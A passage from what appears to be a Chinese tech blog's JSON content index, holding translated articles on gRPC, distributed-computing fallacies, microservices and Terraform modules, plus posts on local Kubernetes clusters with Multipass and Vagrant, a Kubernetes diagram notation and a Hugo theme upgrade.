基础设施的一部分。 大型分布式系统需要安全、健康检查、负载平衡和故障转移、监控、跟踪、日志记录等。 其实现应当提供扩展点以允许这些功能的插拔，并提供默认实现。\n作为 API 扩展 #服务之间必要协作的扩展应该尽可能使用 API 而不是通过协议。这类的扩展可能包括健康检查、服务自省、负载监控和负载均衡分配。\n元数据交换 #常见的横切关注点，如身份验证或跟踪，依赖于不属于服务接口声明的数据交换。部署依赖于它们以不同于服务暴露的单个API的速度演进这些特性的能力。\n标准化状态码 #客户端通常以数量有限的方式响应 API 调用返回的错误。应当限制状态代码的命名空间以使处理这些错误的策略更清晰。 如果需要支持丰富的领域特定状态，则可以使用元数据交换机制来提供。\n（完）\n","date":"March 31, 2022","permalink":"/blog/2022/2022-03-31-grpc-motivation-and-design-principles/","section":"Blogs","summary":"","title":"【翻译】gRPC 的动机和设计原则"},{"content":" 原文: https://en.wikipedia.org/wiki/Fallacies_of_distributed_computing\n分布式计算的谬误是L Peter Deutsch 和太阳微系统公司的其他人提出的一组断言，描述了分布式应用程序新手总是做出的错误假设。\n谬误 #谬误包括：\n网络是可靠的; 零延迟; 带宽是无限的; 网络是安全的; 网络拓扑不会变化; 只有一个管理员; 传输成本是零; 网络是同构的; 谬误的效果 # 编写软件应用程序时很少对网络错误进行错误处理。在网络中断期间，此类应用程序可能会停止或无限等待应答数据包，从而永久消耗内存或其他资源。当出现故障的网络可用时，这些应用程序也可能无法重试任何停止的操作或需要（手动）重新启动。 对网络延迟及其可能导致的数据包丢失的忽略会导致应用层和传输层开发人员允许无限制的流量，从而大大增加丢弃的数据包并浪费带宽。 流量发送方对带宽限制的忽略可能会导致瓶颈。 对网络安全的自负会被不断适应安全措施的恶意用户和程序所欺骗。 网络拓扑的变化可能对带宽和延迟问题都有影响，因此可能会出现上述的问题。 与竞争对手公司的子网一样，多个管理员可能会制定相互冲突的策略，即网络流量的发送者必须知道哪些策略才能完成他们想要的路径。 构建和维护网络或子网的“隐藏”成本是不可忽略的，因此必须在预算中注明以避免资源短缺。 如果一个系统假设一个同构网络，那么它可能会导致与前三个谬误相同的问题。 （完）\n","date":"March 31, 2022","permalink":"/blog/2022/2022-03-31-fallacies-of-distributed-computing/","section":"Blogs","summary":"","title":"【翻译】分布式计算谬误"},{"content":"","date":null,"permalink":"/tags/grpc/","section":"Tags","summary":"","title":"gRPC"},{"content":"","date":null,"permalink":"/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/","section":"Tags","summary":"","title":"云原生"},{"content":" 本文源自 Martin Fowler 的 Bliki 上 2014 年的文章Microservices and the First Law of Distributed Objects\n当我写《企业应用架构模式》一书时，我提出了一个我称之为分布式对象设计第一法则：“不要分布你的对象”。最近几个月业界对微服务的热情增加，让一些朋友对在微服务场景下对这一法则产生疑问，并且如果法则仍然成立，为什么我还要赞同微服务。\n非常重要的一点就是我在第一法则中用了“分布式对象”的说法。它反映了一个在 90 年代末 00 年代初相当流行但此后（正确地）失宠的想法。分布式对象的想法是你可以设计对象并在进程内或远程选择使用相同的对象，远程则指的是在同一台机器的另外一个进程里，或者不同的机器里。比较聪明的中间件，比如，DCOM 或者一个 CORBA 实现，将会处理进程内或者远程之间的差别。因此你可以把你的系统拆分成以多个独立的进程来设计。\n我对分布式对象概念的反对意见是：尽管逆可以在对象边界内封装许多东西，但逆不能封装远程/进程内的区别。 进程内函数调用很快并且总是成功（因为任何异常都是由于应用程序造成的，而不仅仅是由于进行调用的事实）。 但是，远程调用速度要慢几个数量级，并且由于远程进程或连接失败，调用总是有失败的可能。\n这种差异的结果是 API 的设计方式不同。 进程调用可以是细粒度的，如果你想要 100 个产品价格和库存，你可以调用你的产品价格函数 100 次，另外 100 次调用库存。 但是，如果该功能是一个远程调用，你最好将所有这些批处理在到一个调用中实现，一次调用所有 100 个价格和库存。 这会导致产品对象的界面有很大差异。 因此，你不能采用相同的类（主要是和接口相关）并以进程内或远程方式透明地使用它。\n与我交谈过的微服务倡导者非常清楚这种区别，而且我还没有听到他们谈论进程内/远程调用的透明性。 所以他们并没有试图做分布式对象试图做的事情，因此不违反第一定律。 相反，他们提倡通过 HTTP 或轻量级消息和文档进行粗粒度交互。\n所以本质上，我对分布式对象的看法和微服务的倡导者们对微服务的看法并不矛盾。 尽管存在这种基本的非冲突，但现在还需要提出另一个问题。 微服务意味着小型分布式单元通过远程连接进行通信，这比单体应用要多得多。这不违反第一定律的精神，即使它符合它的字面意思吗？\n虽然我承认有正当理由为许多系统进行分布式设计，但我确实认为分布式是复杂性的助推器。 粗粒度的 API 比细粒度的 API 更尴尬。 你需要决定如何处理远程调用失败以及一致性和可用性的后果。 即使你通过协议设计最小化远程调用，仍然需要更多地考虑它们的性能问题。 在设计单体应用时，你必须担心模块之间的职责划分，而对于分布式系统，你必须担心模块之间的职责分配和分布因素。\n虽然小型的微服务确实更加简单，但我担心这会将复杂性推向服务之间的通信，由于通信的不明确，因此更难发现问题。 当你必须跨越远程边界进行重构时，会更加困难。 微服务倡导者吹捧你会从异步通信中降低耦合，但异步是另一个复杂性助推器。千篇一律的扩展允许你在不增加分布式复杂性的情况下处理海量请求。\n因此，我对分布式持谨慎态度，我是倾向整体设计。 鉴于此，为什么我要花费大量精力来描述微服务并支持倡导它的同事？ 答案是因为我知道我的直觉并不总是正确。我不能否认许多团队已经采用了微服务方法并取得了成功，无论是像 Netflix 和（可能）亚马逊这样的知名公共案例，还是我在 Thoughtworks 内外都与之交谈过的各种团队。 我天生就是一个经验主义者，相信经验证据胜过理论，即使这个理论比我的直觉要好得多。\n并不是说我认为这件事已经有定论了。在软件交付中，成功是一件很难定义的事情。尽管像 Netflix 和 Spotify 这样的组织已经大肆宣传他们早先在微服务上的成功，但也有像 Etsy 或 Facebook 这样的例子在单体架构上取得了成功。无论团队认为自己使用微服务多么成功，唯一真正的比较是违反事实的——如果他们使用单体的方式构建应用会更好吗？微服务方法只出现了相对较短的时间，所以我们没有太多证据来自十年前的遗留微服务架构。但可以将微服务与我们非常不喜欢的那些古老的单体应用进行比较。并且可能存在我们尚未确定的因素，这意味着在某些情况下单体应用更好，而其他情况则有利于微服务。鉴于在软件开发中收集证据的困难，即使在多年过去之后，也很可能不会做出有利于其中一个或另一个的令人信服的决定。\n鉴于这种不确定性，像我这样的作家能做的最重要的事情就是尽可能清楚地传达我们认为我们已经学到的教训，即使它们是矛盾的。 读者将自己做出决定，而作为作家，我们的工作是确保这些决定是明智的，无论他们落在架构决策的哪一边。\n（完）\n","date":"March 30, 2022","permalink":"/blog/2022/2022-03-30-distributed-objects-microservices/","section":"Blogs","summary":"","title":"【翻译】微服务和分布式对象第一法则"},{"content":"","date":null,"permalink":"/tags/kubernetes/","section":"Tags","summary":"","title":"Kubernetes"},{"content":"在 通过 Vagrant 一键初始化 K8S 集群 之后，发现 VirtualBox 只支持 X86 芯片，对 Apple M1 不支持。加之 CentOS 的支持也将近尾声。而我在捣鼓 Provisioner 脚本的时候总要花大量的时间测试 CentOS 的兼容性，很耗时间。\n偶然发现 Multipass 可以支持在 Apple M1 虚拟 Ubuntu 实例，效果还不错。所以将 Provisioner 的脚本进行了移植，并基于 Multipass 进行了一层封装以管理整个 k8s 集群。所以花了两周的业余时间调整了一下。\n本文就介绍一下 k8s-multipass，项目地址：https://github.com/wizardbyron/k8s-multipass，欢迎PR。\n当前功能介绍 # 一个 Multipass 的包装器（wrapper），管理本地 k8s 集群生命周期。 创建一个控制面节点，并启用 NFS 和本地 DNS 服务（Bind9），通过 NFS 服务共享加入脚本。并采用 Calico 初始化 Pod 网络。 创建两个工作节点，并通过 NFS 自动加入控制面。 通过 docker 在控制面上新建 LDAP 服务。 使用方法 # 下载 Multipass。 克隆本项目：git clone git@github.com:wizardbyron/provisioners.git 你可以在 k8sctl 命令中调整配置。未来我考虑增加一个读取配置的模块。 进入项目目录，通过./k8sctl create命令一键创建具有两个工作节点的 K8S 集群。 通过./k8sctl login登录到控制面进行管理。 命令介绍 #k8sctl 是管理集群的工具，它包含如下子命令：\n./k8sctl create: 创建一个新的本地 k8s 集群，默认包含一个控制面和两个工作节点。 ./k8sctl start: 启动已停止的本地 k8s 集群上的所有节点。 ./k8sctl stop: 停止的本地 k8s 集群上的所有节点。 ./k8sctl restart: 重启本地 k8s 集群上的所有节点。 ./k8sctl destroy [节点名]: 销毁本地 k8s 集群上的所有节点或指定节点。 ./k8sctl check: 检查 k8s 集群上各节点和 Pod 的状态。 ./k8sctl status: 检查 k8s 集群上各节点虚拟机工作状态。 ./k8sctl login: 登陆控制面进行操作。 项目目录介绍 # 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 k8s-multipass ├── k8sctl # 主控制文件 ├── scripts # 各服务脚本目录 │ ├── dns # DNS 服务端和客户端安装和配置脚本 │ │ ├── client.sh │ │ └── server.sh │ ├── init.sh # 虚拟机初始化脚本目录 │ ├── k8s │ │ ├── install.sh # K8S 安装脚本 │ │ ├── setup-control-plane.sh # 控制面配置脚本。 │ │ └── setup-worker-node.sh # 工作节点配置脚本。 │ ├── nfs # NFS 服务端和客户端安装和配置脚本 │ │ ├── client.sh │ │ └── server.sh │ └── openldap # LDAP 服务端配置脚本 │ └── server.sh └── share # 和虚拟机之间交换文件的共享目录 未来的计划 #这个项目和 MicroK8S 以及 MiniKube 不同。这个项目和 Provisioner 一样，用于产生一个最小的可验证功能的虚拟 K8S 集群环境。随着我的学习和总结，这个项目也会不断完善。\n","date":"March 22, 2022","permalink":"/blog/2022/2022-03-22-setup-k8s-cluster-with-multipass/","section":"Blogs","summary":"","title":"采用 Multipass 管理本机虚拟 K8S 集群"},{"content":"","date":null,"permalink":"/tags/%E5%BC%80%E6%BA%90/","section":"Tags","summary":"","title":"开源"},{"content":"近期，发现我的博客一直使用的博客主题 Congo 升级到了 2.0 版本。新版本增加了一些新特性，并且和最新的 Hugo 保持一致。\n具体的升级参考可以参考官方升级说明 https://jpanther.github.io/congo/docs/version-2/upgrade/，这里我仅仅将自己的升级过程做一个简单的记录。\n由于我之前是下载主题并直接安装到 hugo 的 themes 目录里。这样做不利于主题的同步更新，同时代码库也较大。因此，这次升级我采用 submodule 的方式。\n删除旧 1.0 主题 #首先，删除旧的 1.0 主题，创建一个提交：\n1 2 git rm -rf themes/congo git commit -m \u0026#34;Remove congo 1.0\u0026#34; 通过 Submodule 安装新主题 #然后，通过 Submodule 下载新的 congo 2.0, 创建一个提交：\n1 2 git submodule add --force -b stable https://github.com/jpanther/congo.git themes/congo git commit -m \u0026#34;Install congo 2.0\u0026#34; 这时候，通过 git status 你会发现多了两个文件：.gitmodules和themes/congo\n.gitmodules里是配置 submodule 的信息\nthemes/congo则是以 submodule 方式存在的目录文件。它提交后会在 Github 上引导你进入到 congo 代码库主页。\n调整配置文件 #安装完 Congo 2.0 后运行hugo server 会出现一堆错误，这时候要调整配置了。\n首先，创建 config/_default 文件夹，并创建以下文件：\nconfig.toml: 站点主配置文件，里面的defaultContentLanguage要设置为zh，他会检索languages.\u0026lt;语言\u0026gt;.toml和menu.\u0026lt;语言\u0026gt;.toml两个配置。 languages.zh.toml: 语言配置文件，这里我配置的中文（zh）。 menu.zh.toml: 主页菜单文件，和语言一样，文件需要有中文（zh）的说明。 params.toml: 主题功能参数配置文件。包括主题颜色的切换和一些功能的配置。 具体文件配置内容可以参照https://jpanther.github.io/congo/docs/configuration/#configuration 的说明。\n调整静态资源目录 #由于 Congo 2.0 遵循最新版本的 Hugo 采用了 Pipeline 优化资源。因此之前放在 static 目录下的 作者头像和网站 Logo 要水平迁移至 assets 目录下。只需要新建 assets 目录，将 static 下的图片复制过来即可。\n启用新特性 #Congo 2.0 新增了几个我喜欢的新特性，比如：\n站内搜索功能: 需要在params.toml文件里新增 enableSearch = true选项。 代码复制按钮: 需要在params.toml文件里新增 enableCodeCopy = true选项。（当前还有 bug，我提了一个 issue）。 回到文章开头按钮: 需要在params.toml文件里新增showScrollToTop = true选项。 文章目录功能: 需要在params.toml文件里的[article]选贤管辖新增 showTableOfContents = true选项。同时需要在 config/_default 文件夹下增加 markup.toml 配置来说明目录格式。例如: 1 2 3 4 5 # config/_default/markup.toml [tableOfContents] startLevel = 2 endLevel = 4 其中的 Level 是 Markdown 标题标记的需要。它会根据标题级别自动在文章右边新增目录。\n具体文件配置内容可以参照https://jpanther.github.io/congo/docs/configuration/#configuration 的说明。\n（完）\n","date":"March 18, 2022","permalink":"/blog/2022/2022-03-18-upgrade-to-congo-2/","section":"Blogs","summary":"","title":"博客主题升级到 Congo 2.0"},{"content":"原文：https://www.terraform.io/language/modules/develop/composition\n在只有一个根模块的简单 Terraform 配置中，我们创建一组资源并使用 Terraform 的表达式语法来描述这些资源之间的关系：\n1 2 3 4 5 6 7 8 9 10 resource \u0026#34;aws_vpc\u0026#34; \u0026#34;example\u0026#34; { cidr_block = \u0026#34;10.1.0.0/16\u0026#34; } resource \u0026#34;aws_subnet\u0026#34; \u0026#34;example\u0026#34; { vpc_id = aws_vpc.example.id availability_zone = \u0026#34;us-west-2b\u0026#34; cidr_block = cidrsubnet(aws_vpc.example.cidr_block, 4, 1) } 当我们引入模块时，我们的配置开始变得分层而不是扁平化：每个模块都包含自己的一组资源，可能还有自己的子模块，这可能会创建一个深层、复杂的资源配置树。\n但是，在大多数情况下，我们强烈建议保持模块树扁平化：只有一层子模块，并使用类似于上述的技术，使用表达式来描述模块之间的关系：\n1 2 3 4 5 6 7 8 9 10 11 12 module \u0026#34;network\u0026#34; { source = \u0026#34;./modules/aws-network\u0026#34; base_cidr_block = \u0026#34;10.0.0.0/8\u0026#34; } module \u0026#34;consul_cluster\u0026#34; { source = \u0026#34;./modules/aws-consul-cluster\u0026#34; vpc_id = module.network.vpc_id subnet_ids = module.network.subnet_ids } 我们将这种扁平化的模块使用方式称为模块组合，因为它需要多个可组合的构建块模块并将它们组装在一起以产生更大的系统。\n模块不是嵌入其依赖项，创建和管理自己的副本，而是从根模块接收其依赖项，因此可以以不同的方式连接相同的模块以产生不同的结果。\n依赖倒置 #在上面的示例中，我们看到了一个名为 consul_cluster 的模块，它可能描述了在 AWS VPC 网络中运行的 HashiCorp Consul 服务器集群，因此它需要 VPC 和该 VPC 内的子网标识符作为参数。\n另一种设计是让 consul_cluster 模块描述它自己的网络资源。如果我们这样做，那么 Consul 集群将很难与同一网络中的其它基础设施共存，所以我们希望尽可能保持模块相对小，并传递它们的依赖项。\n这种依赖倒置方法还提高了未来重构的灵活性，因为 consul_cluster 模块不知道也不关心调用模块如何获取这些标识符。 未来的重构可能会将网络创建分离到自己的配置中，因此我们可以将这些值从数据源传递到模块中：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 data \u0026#34;aws_vpc\u0026#34; \u0026#34;main\u0026#34; { tags = { Environment = \u0026#34;production\u0026#34; } } data \u0026#34;aws_subnet_ids\u0026#34; \u0026#34;main\u0026#34; { vpc_id = data.aws_vpc.main.id } module \u0026#34;consul_cluster\u0026#34; { source = \u0026#34;./modules/aws-consul-cluster\u0026#34; vpc_id = data.aws_vpc.main.id subnet_ids = data.aws_subnet_ids.main.ids } 有条件的创建对象 #在跨多个环境使用同一个模块的情况下，通常会看到一些必要的对象已经存在于某些环境中，但在其他环境中还需要创建。\n例如，这可能出现在开发环境场景中：出于成本原因，某些基础架构可能会在多个开发环境中共享，而在生产环境中，基础架构是唯一的，并由生产配置直接管理。\n我们建议采用依赖倒置的方式：让模块通过输入变量接受它需要的对象作为参数，而不是尝试编写一个检测其存在并创建它的模块。\n例如，考虑一个 Terraform 模块基于磁盘映像部署计算实例的情况，并且在某些环境中有一个专用磁盘映像可用，而其他环境共享一个公共基础磁盘映像。与其让模块本身处理这两种情况，不如为表示磁盘映像的对象声明一个输入变量。以 AWS EC2 为例，我们可以声明 aws_ami 资源类型和数据源模式的公共子类型：\n1 2 3 4 5 6 7 8 variable \u0026#34;ami\u0026#34; { type = object({ # 仅使用模块所需的属性子集声明对象。 # Terraform 将允许任何至少具有这些属性的对象。 id = string architecture = string }) } 该模块的调用者现在可以自己直接表示这是要内联创建的 AMI 还是要从其他地方检索的 AMI：\n1 2 3 4 5 6 7 8 9 10 11 12 13 # 这种情形下我们将自己管理 AMI resource \u0026#34;aws_ami_copy\u0026#34; \u0026#34;example\u0026#34; { name = \u0026#34;local-copy-of-ami\u0026#34; source_ami_id = \u0026#34;ami-abc123\u0026#34; source_ami_region = \u0026#34;eu-west-1\u0026#34; } module \u0026#34;example\u0026#34; { source = \u0026#34;./modules/example\u0026#34; ami = aws_ami_copy.example } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # 或者，AMI 已经在某处存在了 data \u0026#34;aws_ami\u0026#34; \u0026#34;example\u0026#34; { owner = \u0026#34;9999933333\u0026#34; tags = { application = \u0026#34;example-app\u0026#34; environment = \u0026#34;dev\u0026#34; } } module \u0026#34;example\u0026#34; { source = \u0026#34;./modules/example\u0026#34; ami = data.aws_ami.example } 这与 Terraform 的声明式风格一致：我们并不构建条件分支复杂的模块，而是直接描述应该存在的内容以及希望 Terraform 管理的内容。\n通过遵循这种风格，我们可以确定在哪些情况下应该 AMI 存在，哪些情况下不应该存在。维护配置的人以后可以了解这些配置的意图，而无需检查云上的状态。\n在上面的示例中，要创建或读取的对象非常简单，可以作为单个资源内联提供，但是在依赖项本身足够复杂以从中受益的情况下，我们也可以将多个模块组合在一起，如本页其他地方所述的一样。\n多云（Multi-cloud）抽象 #Terraform 本身不会尝试抽象不同供应商提供的类似服务，因为我们希望在每个产品中开放全部功能，但在单个接口后面统一多个产品往往需要“最小公分母”方法。\n但是，通过 Terraform 模块的组合，可以通过自己权衡哪些平台功能对您很重要来创建自己的轻量级多云抽象。\n在多个供应商实现相同概念、协议或开放标准的任何情况下，都会出现这种抽象的机会。例如，域名系统的基本功能在所有供应商中都是通用的，尽管一些供应商通过地理定位和智能负载平衡等独特功能来区分自己，但您可能会得出结论，在您的用例中您愿意避开这些功能作为对创建模块的回报，这些模块将多个供应商的通用 DNS 概念抽象化：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 module \u0026#34;webserver\u0026#34; { source = \u0026#34;./modules/webserver\u0026#34; } locals { fixed_recordsets = [ { name = \u0026#34;www\u0026#34; type = \u0026#34;CNAME\u0026#34; ttl = 3600 records = [ \u0026#34;webserver01\u0026#34;, \u0026#34;webserver02\u0026#34;, \u0026#34;webserver03\u0026#34;, ] }, ] server_recordsets = [ for i, addr in module.webserver.public_ip_addrs : { name = format(\u0026#34;webserver%02d\u0026#34;, i) type = \u0026#34;A\u0026#34; records = [addr] } ] } module \u0026#34;dns_records\u0026#34; { source = \u0026#34;./modules/route53-dns-records\u0026#34; route53_zone_id = var.route53_zone_id recordsets = concat(local.fixed_recordsets, local.server_recordsets) } 在上面的示例中，我们以“记录集”的形式创建了一个轻量级的抽象。这个抽象包含描述应该可映射到任何 DNS 供应商的 DNS 记录的一般概念的属性。\n然后，我们将该抽象实例化为一个模块。在本例中将记录集部署到 AWS 的 Route53 服务上。\n如果你想以后切换到不同的 DNS 供应商，只需将 dns_records 模块中的内容替换为新供应商的实现，从而使记录集中定义的所有记录配置保持不变。\n你可以在 Terraform 通过定义代表所涉及概念的对象，然后将这些对象类型用于模块输入变量来创建像这样的轻量级抽象。 在这种情况下，所有的“DNS 记录”实现都将声明以下变量：\n1 2 3 4 5 6 7 8 variable \u0026#34;recordsets\u0026#34; { type = list(object({ name = string type = string ttl = number records = list(string) })) } DNS 只是一个简单的示例，但仍有更多机会利用供应商之间的通用元素。 一个更复杂的例子是部署 Kubernetes 集群，现在有许多不同的供应商提供托管的 Kubernetes 集群服务，甚至还有更多运行 Kubernetes 的方法。\n如果所有这些实现中的通用功能足以满足您的需求，您可以选择实现一组不同的模块来描述特定的 Kubernetes 集群实现，并且都具有将集群的主机名导出为输出值的共同特征：\n1 2 3 output \u0026#34;hostname\u0026#34; { value = azurerm_kubernetes_cluster.main.fqdn } 然后，您可以编写仅期望 Kubernetes 集群主机名作为输入的其他模块，并将它们与您的任何 Kubernetes 集群模块互换使用：\n1 2 3 4 5 6 7 8 9 10 11 module \u0026#34;k8s_cluster\u0026#34; { source = \u0026#34;modules/azurerm-k8s-cluster\u0026#34; # (Azure-specific configuration arguments) } module \u0026#34;monitoring_tools\u0026#34; { source = \u0026#34;modules/monitoring_tools\u0026#34; cluster_hostname = module.k8s_cluster.hostname } 只读模块 #大多数模块都包含 resource 部分，它描述了要创建和管理的基础设施。有时编写根本不描述任何新基础设施，而只用来检索有关使用data sources在其他地方创建的基础设施信息也是一种常见的方式。\n作为模块的使用约定，我们建议仅在模块以某种方式提高抽象级别时才用这种用法。在这种情况下会通过精确封装的数据的检索方式。\n这种技术的一个常见用途是当一个系统被分解为几个子系统配置，但某些基础设施在各子子系统之间共享的时候。例如一个公共 IP 网络。 在这种情况下，我们可能会编写一个名为 join-network-aws 的共享模块，当部署在 AWS 中时，任何需要共享网络信息的配置都可以调用该模块：\n1 2 3 4 5 6 7 8 9 10 11 12 module \u0026#34;network\u0026#34; { source = \u0026#34;./modules/join-network-aws\u0026#34; environment = \u0026#34;production\u0026#34; } module \u0026#34;k8s_cluster\u0026#34; { source = \u0026#34;./modules/aws-k8s-cluster\u0026#34; subnet_ids = module.network.aws_subnet_ids } 网络模块本身可以通过多种不同的方式检索这些数据：它可以使用 aws_vpc 和 aws_subnet_ids 数据源直接查询 AWS API，或者它可以使用 consul_keys 从 Consul 集群中读取保存的信息，或者它可以直接从 使用 terraform_remote_state 管理网络的配置状态。\n这种方法的主要好处是，此信息的来源可以随时间变化，而无需更新依赖它的每个配置。 此外，如果您将纯数据模块设计为具有与相应管理模块相似的一组输出，则在重构时可以相对轻松地在两者之间进行切换。\n(完)\n","date":"March 17, 2022","permalink":"/blog/2022/2022-03-17-terraform-module-composition/","section":"Blogs","summary":"","title":"【翻译】Terraform 最佳实践：模块组合"},{"content":"","date":null,"permalink":"/tags/terraform/","section":"Tags","summary":"","title":"Terraform"},{"content":"","date":null,"permalink":"/tags/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%8D%B3%E4%BB%A3%E7%A0%81/","section":"Tags","summary":"","title":"基础设施即代码"},{"content":"在网上搜索规范化的 K8S 的部署架构图画法时，发现了 Redhat 的一篇博客。觉得非常不错，遂翻译分享之。\n原文: https://github.com/raffaelespazzoli/kdl\n介绍 #这篇博文介绍了 Kubernetes API 对象的图形表示法：Kubernetes 部署语言（简称 KDL）。 Kubernetes API 对象可被用于描述如何在 Kubernetes 中部署一个解决方案。\n笔者认为有必要描述和记录如何在 Kubernetes 中部署应用程序，特别是当应用程序用到了多个不同的 Kuberenetes 组件时。\n笔者想创建一个简单的图形符号约定来描述这些应用程序的部署，以便这些图形可以轻松地在白板或文档中绘制。\n为了更好地解释该符号体系的目标，我们可以将其与 UML比较。UML 有几种图形语言来描述应用程序架构的不同方面。 不过，与 UML 的不同之处在于，在 KDL 中，我们没有进行正向或逆向工程的目标（即我们不转换 yaml 文件中的图表，反之亦然）。 这样，我们就有机会管理要在图表中显示的信息量。 作为一般经验法则，我们只会显示与架构相关的信息。\n您还可以下载 KDL 的 visio模板。\n目标 #该图形符号体系的目标如下：\n创建一种通用的图形语言来描述如何在 Kubernetes 中部署应用程序。 表示 Kubernetes API 对象与架构最相关的方面。 简单地说，在理想情况下，一个拥有白板和一些彩色便利贴的人应该能够创建这些图表。 以下内容不是该符号体系的目标：\n自动生成 API 对象定义 颜色编码 #一般来说，Kubernetes API 对象涵盖以下范畴：\n范畴 颜色约定 例子 Kubernetes 集群 红 Kubernetes 解决方案中包含的若干个集群 计算 绿 部署 网络 黄 服务 存储 蓝 持久卷申领（PersistentVolumeClaim），持久卷（PersistentVolume） Kubernetes 集群 #Kubernetes 集群可以简单地表示为一个红色的矩形：\n所有其他 API 对象都存在于集群内部或集群边缘。 永远不需要显式表现 Kubernetes 集群内的各个节点。\n您可以用其它的图形表示集群外部的组件以及它们如何与集群内部的组件连接。 此图形约定不含集群外的组件的展示方式。\n计算 #计算对象是最复杂的图形。 通常，它们由一个带有组件标识的矩形表示，用于展示计算对象的附加信息。 这是一个模板：\n图片的中心部分代表一个 Pod。 在其中我们可以看到一个或多个容器。 Pod 和容器都应该有一个名称。\n在 Pod 的左侧，我们有额外的计算附加信息。 顶部标记指定此 Pod 的控制器类型。 以下是控制器的类型及其缩写：\n控制器类型 缩写 Replication Controller RC Replica Set RS Deployment D DeploymentConfig (OpenShift only) DC DaemonSet DS StatefulSet SS Job J Cron Job J 在底部，我们有该 Pod 实例的基数。 根据控制器的类型，该字段具有不同的含义和格式，这里有一个参考表格：\n控制器类型 格式 Replication Controller 一个数字或者数字范围 (例如 3 或 2:5) ReplicaSet 一个数字或者数字范围 (例如 3 或 2:5) Deployment 一个数字或者数字范围 (例如 3 或 2:5) DeploymentConfig (只有 OpenShift 有) 一个数字或者数字范围 (例如 3 或 2:5) DaemonSet 节点选择器: 例如 storage-node=true StatefulSet 一个数字: 例如 3 Job 一个表示并行度的数字: 例如 3 Cron Job 一个表示并行度的数字: 例如 3 在 pod 的顶部，是暴露的端口。 您可以使用小矩形仅显示端口号或添加端口名称。 这是一个例子：\n这些小矩形是黄色的，因为代表网络配置。您可以将每个端口与实际暴露该端口相关的容器连接起来。 但在大多数情况下，这不是必需的，因为大多数 pod 只有一个容器。\n在 pod 的底部，我们有 附加卷。 卷的名称应显示在矩形中。 在大多数情况下，这些将是持久卷。 如果卷类型不是持久卷，则显示它可能是相关的。 此外，有时显示安装点也很重要。 以下是卷的符号示例：\n在 Pod 的右侧，具有与 Pod 的配置相关的卷：secrets 和 configmaps。 对于数据卷，应该指明卷的名称，通常区分configmaps和secret很重要，所以还应该指明卷的类型，如果需要还可以显示挂载点。 这里有些例子：\n网络 #网络对象有两种: services 和 ingresses (routes 在 OpenShift 里有).\n服务 #服务可以用椭圆表示，如下图所示:\n左侧有一个代表服务类型的小矩形。 以下是缩写：\n类型 缩写 Cluster IP CIP Cluster IP, ClusterIP: None HS a.k.a. Headless Service Node Port NP LoadBalancer LB External Name (OpenShift only) EN External IP EIP 在服务的顶部有暴露的端口。 此处适用与计算对象端口相同的约定。\n该服务应连接到计算对象。 这将隐式定义服务选择器，因此无需在图片中指示它。\n如果服务允许从集群外部到内部 pod 的流量（例如负载均衡器或节点端口或外部 IP），则应在集群边缘进行描述。\n相同的概念适用于调节出站流量（例如外部名称）的服务，尽管在这种情况下它们可能会出现在 Kubernetes 集群矩形的底部。\nIngress #Ingress 可以用平行四边形表示，如下图：\nIngress 显示 Ingress 名称以及可选的 host。 Ingress 将连接到服务（相同的规则适用于 OpenShift 路由）。\nIngress 始终显示在 OpenShift 集群的边缘。\n路由 (OpenShift) #OpenShift 路由使用与 Ingress 相同的符号表示。\n存储 #存储用于指示持久卷。 存储的颜色是蓝色的，它的形状是一个桶，部署如下图：\n存储应指明持久卷名和存储提供程序（例如 NFS、gluster 等）。 存储始终位于集群的边缘，因为它是指向外部可用存储的配置。\nPutting it all together #在本节中，我们将通过一个示例来说明如何使用此表示法来描述应用程序的部署。 我们的应用程序是一个银行服务应用程序，它使用 mariadb 数据库作为其数据存储。 作为银行应用程序，一切都必须在 HA 中。 以下是部署图：\n请注意，mariadb pod 使用 StatefulSet 和一个持久卷来存储其数据。 这个 pod 没有暴露给集群外部，但它的服务被 BankService 应用程序使用。 BankService 应用程序是一个由部署配置控制的无状态 pod，该部署配置具有用于访问数据库的凭据的机密。 它还有一个服务和一个路由，以便它可以接受来自集群外部的入站连接。\n","date":"February 15, 2022","permalink":"/blog/2022/2022-02-15-kdl/","section":"Blogs","summary":"","title":"【翻译】Kubernetes 部署语言（Kubernetes Deployment Language）"},{"content":"起因 #去年初我开始系统学习 K8S，就想能生成一个集群环境。查看了一下官方文档，步骤很多。网上的一些资源已经过期或者不可用，再加上各种资源的变更和国内不可访问。\n不得不说，在家按照官方文档搭建一个标准的 K8S 集群真是太难了！\n所以我就自己构建了一个最小的 K8S 集群环境，放在了我的 provisioner 代码库里。现在这个开源代码库可以自动一键建立一个拥有一个控制节点和两个工作节点的最小K8S集群，可以反复销毁和启动。\n过年在家的时间就对相关的脚本进行了完善，项目地址可参考：https://github.com/wizardbyron/provisioners，本文是对相关脚本的说明。\n关于 Provisioner 项目 #Provisioners 是我个人用于构建“最小可用集群”的一站式自动化脚本库。是我练习构建各种系统工具的一站式脚本收集仓库。它默认会通过 vagrant启动三个虚拟机，分别是管理节点（admin）和两个工作节点（node-1和node-2，最大支持到node-9）。管理节点的 IP 是192.168.56.10。工作节点是192.68.56.11~192.168.56.19。你可以通过修改Vagrantfile调整数量。\nProvisioners 分为solution（解决方案）和facility（设施）两个脚本目录。\nfacility 里面则是单个工具的初始化脚本，包含各个工具的一键式初始化脚本。\nsolution 则是利用facility里的工具脚本组合成的解决方案，包括管理节点和工作节点。\n此外，essential里包含了init.sh脚本，这是用于统一初始化 Linux 节点的统一基础脚本。而对于管理节点和工作节点的自动化初始配置则在solution目录里每个解决方案下的admin/setup.sh和worker/setup.sh里。\nVagrantfile 配置说明 #这个 Vagrantfile 的核心配置都写在了文件的前面。修改其中的参数可以改变集群相关配置。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 SOLUTION = \u0026#34;k8s\u0026#34; # default/devops/k8s BOXES ={ \u0026#34;ubuntu\u0026#34; =\u0026gt; \u0026#34;ubuntu/focal64\u0026#34;, \u0026#34;centos\u0026#34; =\u0026gt; \u0026#34;centos/7\u0026#34; } # 支持BOXES里面列出的 vbox 虚拟机镜像 DISTRO = \u0026#34;centos\u0026#34; # Linux 